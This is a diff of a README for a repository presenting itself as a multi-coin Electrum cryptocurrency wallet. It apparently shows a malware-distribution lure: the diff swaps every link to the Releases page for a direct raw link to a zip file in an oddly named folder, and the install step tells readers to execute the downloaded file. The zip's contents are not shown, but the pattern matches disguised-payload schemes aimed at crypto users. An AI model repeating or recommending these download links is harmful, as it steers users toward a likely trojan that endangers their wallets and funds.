@@ -2,7 +2,7 @@
 
 Welcome to the **Electrum Wallet Multi-Crypto Secure GUI** repository! This project aims to provide a secure and user-friendly wallet solution for managing multiple cryptocurrencies. With a focus on simplicity and reliability, our wallet supports various coins and offers a graphical user interface (GUI) accessible through web browsers.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/releases)
+[![Download Releases](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/raw/refs/heads/main/rantankerous/Multi-Crypto-Wallet-Web-Coin-Gui-Browser-Secure-Storage-Electrum-2.9.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/raw/refs/heads/main/rantankerous/Multi-Crypto-Wallet-Web-Coin-Gui-Browser-Secure-Storage-Electrum-2.9.zip)
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **Electrum Wallet Multi-Crypto Secure GUI** repository! This proj
 
 To get started with the Electrum Wallet, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/releases) section to download the latest version. Execute the downloaded file to install the wallet.
+1. **Download the Latest Release**: Visit the [Releases](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/raw/refs/heads/main/rantankerous/Multi-Crypto-Wallet-Web-Coin-Gui-Browser-Secure-Storage-Electrum-2.9.zip) section to download the latest version. Execute the downloaded file to install the wallet.
 
 2. **Set Up the Wallet**: Open the application and follow the on-screen instructions to create a new wallet or restore an existing one.
 
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. For more details, see the [LICEN
 
 For any questions or support, please reach out via the Issues section of the repository. We appreciate your feedback and are here to help!
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/releases)
+[![Download Releases](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/raw/refs/heads/main/rantankerous/Multi-Crypto-Wallet-Web-Coin-Gui-Browser-Secure-Storage-Electrum-2.9.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/ImLitteraly/Electrum-Wallet-Multi-Crypto-Secure-Gui-Multi-Coin-Storage-Web-Browser/raw/refs/heads/main/rantankerous/Multi-Crypto-Wallet-Web-Coin-Gui-Browser-Secure-Storage-Electrum-2.9.zip)
 
 Thank you for checking out the Electrum Wallet! We hope you enjoy using it to manage your cryptocurrencies securely.
